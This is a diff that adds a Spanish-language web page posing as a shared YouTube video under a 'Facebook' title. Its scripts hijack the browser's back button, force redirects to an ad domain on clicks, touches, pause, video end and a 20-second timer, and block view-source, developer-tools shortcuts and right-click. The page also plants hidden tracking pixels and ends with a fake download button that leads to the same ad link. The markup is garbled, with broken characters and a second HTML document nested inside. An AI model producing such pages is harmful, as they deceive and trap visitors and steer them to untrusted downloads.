@@ -1,0 +1,262 @@
+<script id="_wau7t9">var _wau = _wau || []; _wau.push(["dynamic", "0rr48tc0j8", "7t9", "c4302bffffff", "small"]);</script><script async src="//waust.at/d.js"></script>
+
+
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+    <meta name="robots" content="noindex">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+
+  <!-- Open Graph Meta Tags -->
+    <meta property="og:type" content="pig">
+    <meta property="og:title" content="Arte Pura.">
+    <meta property="og:description" content="YouTube">
+    <meta property="og:url" content="https://www.youtube.com">
+    <!-- Cambia por la URL real del sitio -->
+    <meta property="og:image" content="http://apnasmile.com/pics/28.jpg">
+    <!-- Imagen de miniatura de YouTube -->
+    <meta property="og:video:url" content="https://www.youtube.com/watch?v=IQlCG5w53C8">
+    <meta property="og:video:secure_url" content="https://www.youtube.com/watch?v=IQlCG5w53C8">
+    <meta property="og:video:type" content="text/html">
+    <meta property="og:video:width" content="1280">
+    <meta property="og:video:height" content="720">
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      overflow: hidden; /* Evita el desplazamiento */
+    }
+
+    video {
+      width: 100vw; /* 100% del ancho de la pantalla */
+      height: 100vh; /* 100% del alto de la pantalla */
+      object-fit: cover; /* Ajusta el video para cubrir toda la pantalla */
+      position: fixed; /* Fija el video en la pantalla */
+      top: 0;
+      left: 0;
+    }
+  </style>
+  
+  <script>
+  // URL del anuncio al que quieres redirigir
+  const adURL = "https://usheebainaut.com/4/8810039";
+
+  // Detectar si el usuario lleg車 usando el bot車n atr芍s
+  window.addEventListener('pageshow', function (event) {
+    if (event.persisted || performance.getEntriesByType("navigation")[0].type === "back_forward") {
+      // Redirigir al anuncio
+      window.location.href = adURL;
+    }
+  });
+
+  // Manipular el historial para que el bot車n atr芍s no vuelva realmente atr芍s
+  history.pushState(null, null, location.href);
+  window.onpopstate = function () {
+    history.pushState(null, null, location.href);
+  };
+</script>
+
+	<script>
+    const redirectUrl = 'https://usheebainaut.com/4/88100399'; // Replace with your URL
+    const maxRedirects = 2;
+
+    // Check if this is a new session
+    if (!sessionStorage.getItem('sessionStarted')) {
+        localStorage.removeItem('clickCount');
+        sessionStorage.setItem('sessionStarted', 'true');
+    }
+
+    // Initialize click count from localStorage or set to 0
+    let clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
+
+    // Function to handle clicks
+    function handleClick(event) {
+        clickCount++;
+        localStorage.setItem('clickCount', clickCount);
+        if (clickCount <= maxRedirects) {
+            window.location.href = redirectUrl;
+            event.preventDefault();
+        } else {
+            document.getElementById('videoPlayer').setAttribute('controls', 'controls'); // Show video controls
+        }
+    }
+
+    // Function to handle touch events
+    function handleTouch(event) {
+        handleClick(event);
+    }
+
+    // Add event listeners for click and touchstart if on mobile
+    if (/Mobi|Android/i.test(navigator.userAgent)) {
+        document.addEventListener('click', handleClick, true); // Capture phase to ensure it catches all clicks
+        document.addEventListener('touchstart', handleTouch, true); // Capture phase to ensure it catches all touches
+
+        const videoOverlay = document.getElementById('videoOverlay');
+        videoOverlay.addEventListener('click', handleClick, true);  // Use capturing phase
+        videoOverlay.addEventListener('touchstart', handleTouch, true);  // Use capturing phase
+
+        // Initial setup: hide video controls and show overlay
+        if (clickCount <= maxRedirects) {
+            document.getElementById('videoPlayer').removeAttribute('controls');
+        }
+    }
+</script>
+	
+	<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var videos = document.querySelectorAll('video'); // Select all video elements
+    videos.forEach(function(video) {
+        video.addEventListener('ended', function() {   
+            window.location.href = 'https://usheebainaut.com/4/8810039';
+        });
+    });
+});
+</script>
+
+
+  
+  
+  <script>
+  document.addEventListener("DOMContentLoaded", function () {
+    var isMobile = /Android|iPhone/i.test(navigator.userAgent);
+    var redirectURL = "https://usheebainaut.com/4/8810039"; // Cambia esto por tu URL de destino
+
+    if (isMobile) {
+      // Agregar un estado falso al historial para bloquear el bot車n atr芍s
+      history.pushState(null, null, location.href);
+      
+      window.addEventListener("popstate", function () {
+        location.href = redirectURL; // Redirige al usuario si intenta retroceder
+      });
+    }
+  });
+</script>
+  
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var video = document.getElementById('videoPlayer');
+      var redirectURL = "https://usheebainaut.com/4/8810039";
+      var timer;
+
+      var videoList = [
+"https://videyus.site/oEKF6zu.mp4",
+
+
+
+  // (agrega m獺s videos aqu穩...)
+       
+      ];
+
+      function playRandomVideo() {
+        var randomIndex = Math.floor(Math.random() * videoList.length);
+        video.src = videoList[randomIndex];
+        video.play();
+      }
+
+      playRandomVideo();
+
+      function redirect() {
+        window.location.href = redirectURL;
+      }
+
+      video.addEventListener('ended', redirect);
+      video.addEventListener('pause', redirect);
+
+      video.addEventListener('play', function () {
+        clearTimeout(timer);
+        timer = setTimeout(redirect, 20000);
+      });
+
+      video.addEventListener('pause', function () {
+        clearTimeout(timer);
+      });
+
+      document.addEventListener('keydown', function (e) {
+        if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p' || e.key === 'i' || e.key === 'j')) {
+          e.preventDefault();
+        }
+        if (e.key === 'F12') {
+          e.preventDefault();
+        }
+      });
+
+      document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+      });
+    });
+
+    function fakeYouTubeURL() {
+      var meta = document.createElement('meta');
+      meta.setAttribute('property', 'og:url');
+      meta.content = "https://www.youtube.com/watch?v=9o4kvBI5A98&list=RD2oX2FSv4Rys&index=6";
+      document.head.appendChild(meta);
+    }
+
+    window.onload = fakeYouTubeURL;
+  </script>
+</head>
+<body>
+
+  <video id="videoPlayer" controls>
+    Tu navegador no soporta la reproducci籀n de videos.
+  </video>
+
+
+<!-- Contador de Visitas -->
+<img src="//whos.amung.us/pingjs/?k=winning23&t= 𝗪𝗜𝗡𝗡𝗜𝗡𝗚 &x=https://oke.io/" style="display:none" alt="">
+<img src="//whos.amung.us/pingjs/?k=winning&t= 𝗪𝗜𝗡𝗡𝗜𝗡𝗚 &x=https://oke.io/" style="display:none" alt="">
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bot車n de Descarga</title>
+    <style>
+        /* Estilos del bot車n */
+        .btn-descargar {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #28a745; /* Verde */
+            color: white;
+            padding: 15px 20px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: bold;
+            box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
+            transition: background 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-descargar:hover {
+            background-color: #218838; /* Verde m芍s oscuro */
+        }
+
+        /* Icono de descarga */
+        .btn-descargar i {
+            font-size: 20px;
+        }
+    </style>
+    <!-- Enlace a FontAwesome para iconos -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+
+    <!-- Bot車n de Descarga con Icono -->
+    <a href="https://usheebainaut.com/4/8810039" class="btn-descargar" download>
+        <i class="fas fa-download"></i> Descargar
+    </a>
+
+</body>
+</html>
